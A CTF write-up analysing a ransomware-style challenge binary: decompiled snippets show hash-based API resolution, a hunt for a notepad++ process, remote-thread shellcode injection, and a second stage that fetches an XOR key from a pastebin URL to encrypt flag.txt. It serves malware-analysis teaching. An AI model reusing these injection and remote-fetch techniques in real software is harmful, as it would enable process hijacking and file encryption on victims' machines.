# Pwn - Ran Somewhere
- Solved by: @Elma
- Flag: **-UNKNOWN-**

## Writeup

This challenge acts as a malware/ransomware. I highly recommend this challenge for someone who enjoys or is looking into getting into malware analysis sortof stuff. This writeup doesn't go into every single small detail, so the reader is recommended to download and try analyzing it themselves.

We are provided with the malware itself, alongside what seems to be a flag file that has been encrypted by the malware. The challenge also hints at the malware having a broken shellcode loader.

Let's break this down into parts. In the first part of the code, the program does API resolution by matching for a corresponding function hash within a DLLs exports. This is a common malware technique, and can be identified by analyzing the code within.

> We can tell by analyzing the code for **sub_140011C0** where we see that it transverses the PEB and walk down the DLL and it's exports.
>
> We can further assert our assumption by checking it in a debugger. We can see that the function returns function pointers from DLLs.

```c
  v65 = (__int64 (__fastcall *)(void *, _QWORD, _QWORD, void *, _QWORD, _DWORD, _QWORD))sub_1400011C0(
                                                                                          argc,
                                                                                          2794307353i64,
                                                                                          envp);
  v5 = (__int64 (__fastcall *)(_QWORD, _QWORD))sub_1400011C0(v3, 0xA650376Bi64, v4);
  v63 = v5;
  v64 = (__int64 (__fastcall *)(__int64, _QWORD, __int64, __int64, int))sub_1400011C0(v6, 0xECFC793i64, v7);
```

The program enumerates through the processes that are running on the system.

```c
  if ( !K32EnumProcesses((DWORD *)v13, 0x1000u, &cbNeeded) )
    goto LABEL_69;
  // .. .truncated...
    if ( !K32EnumProcessModules(v28, &hModule, 8u, &v80) )
    {
      CloseHandle(v29);
      goto LABEL_50;
    }
    // ... truncated ...
    if ( K32GetModuleBaseNameA(v29, hModule, v30, 0x104u) )
    {
      // ... truncated ...
      if ( Size == v33 && !memcmp(v34, v30, Size) ) // some sort of comparison of process names
        break;
    }
```

We can see that it seems to be enumerating running processes, and looking for a particular process. If we breakpoint at the **memcmp** call, we will see that it is looking for a process named "notepad++".

In the next part of the program, it attempts to inject shellcode into the Notepad++ process.

```c
  // open process handle
  process_handle = ((__int64 (__fastcall *)(__int64, _QWORD, _QWORD))OpenProcess)(0x1FFFFFi64, 0i64, v38);
  // allocate RWX memory within opened process
  v43 = (void *)VirtualAllocEx(process_handle, 0i64, 1i64, 0x1000i64, PAGE_EXECUTE_READWRITE);
  // write shellcode into allocated memory
  WriteProcessMemory(v41, v43, &shellcode, 1ui64, 0i64) // nBytes = 1 ?!?!?
  v49 = (void *)CreateRemoteThread(v41, 0i64, 0i64, v44, 0i64, 0, 0i64); // execute shellcode in remote process
  // ...
  print(std::cout, "[*] Shellcode injected...");
  print(std::cout, "[*] Waiting for thread to die...");
  print(std::cout, "[*] Press enter to exit...");
  std::istream::get(std::cin);
```

However, we can notice that this form of shellcode injection is rather problematic. Firstly, the program only copies 1 byte of the shellcode into the remote process. The allocated memory also doesn't seem big enough to contain the entire shellcode.

That explains why the shellcode loading is problematic as mentioned from the challenge description. In order to get the shellcode to run, we can choose to extract the shellcode.

However being a lazy person, I took a slightly different approach. My plan is just to jump to the shellcode at runtime using a debugger.

```c
.data:0000000140007050 shellcode:                              ; DATA XREF: main+589↑o
.data:0000000140007050                 call    sub_140012015
```

From IDA, we can identify that the shellcode is within the `.data` section which is not executable memory. In order to jump to the shellcode, we want to make sure to modify the memory permissions to be executable.

```py
# after entering debug mode in IDA, breakpoint at the first instruction in main

virt = ida_idd.Appcall.proto("kernel32_VirtualProtect", "BOOL __stdcall VirtualProtect(LPVOID addr, DWORD sz, DWORD newprot, PDWORD oldprot);")

shellcode = 0x7FF777A57050

virt(shellcode, 0x10000, 0x40, shellcode-0x8) # virtualprotect shellcode into RWX memory
```

We can then jump to the shellcode by using the `Ctrl+N` hotkey. The shellcode initially seems to be very complicated, and I wasn't sure what was going on either. But after clicking for abit, I found that it was decrypting some data within the program. And then I came across this:

```
000001377D3D1280  00 00 00 00 00 98 00 00  4D 5A 90 00 03 00 00 00  ........MZ......
000001377D3D1290  04 00 00 00 FF FF 00 00  B8 00 00 00 00 00 00 00  ................
000001377D3D12A0  40 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  @...............
000001377D3D12B0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001377D3D12C0  00 00 00 00 F8 00 00 00  0E 1F BA 0E 00 B4 09 CD  ................
000001377D3D12D0  21 B8 01 4C CD 21 54 68  69 73 20 70 72 6F 67 72  !..L..This progr
000001377D3D12E0  61 6D 20 63 61 6E 6E 6F  74 20 62 65 20 72 75 6E  am cannot be run
000001377D3D12F0  20 69 6E 20 44 4F 53 20  6D 6F 64 65 2E 0D 0D 0A   in DOS mode....
```

Seems like there is yet another embedded executable within the shellcode. We can dump out this executable from memory and reverse it. You can find the dumped exe in the appcode folder.

```c
URLOpenBlockingStreamW(0i64, L"https://pastebin.com/raw/2xzffw3K", &v27, 0, 0i64);
// ...
copy_str(v29, "flag.txt", 8ui64);
read_file(&flag_handle, v29);
xor_encrypt(Src, &flag_handle, (__int64 *)v39);
// ...
copy_str(lpText, "You have been pwned !! XD", 0x19ui64);
v14 = (const CHAR *)lpText;
if ( v35.m128i_i64[1] >= 0x10ui64 )
  v14 = lpText[0];
MessageBoxA(0i64, v14, "??????", 0);
// ...
```

Although the reversing is not 100% certain, we can guess the behaviour of this program

- Read `flag.txt` file contents
- Encrypt the contents of `flag.txt`
- Write the encrypted contents to `flag.YIKES.txt`

If we look at the contents of the pastebin link, we have this string `c405d216`. If we use this as the XOR key, we will obtain the flag.

Decryption found [here](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'c405d216'%7D,'Standard',false)&input=MGBxeyBxfngYY1gFO0AFeDwBX3hXZXlzEXEPSG4).
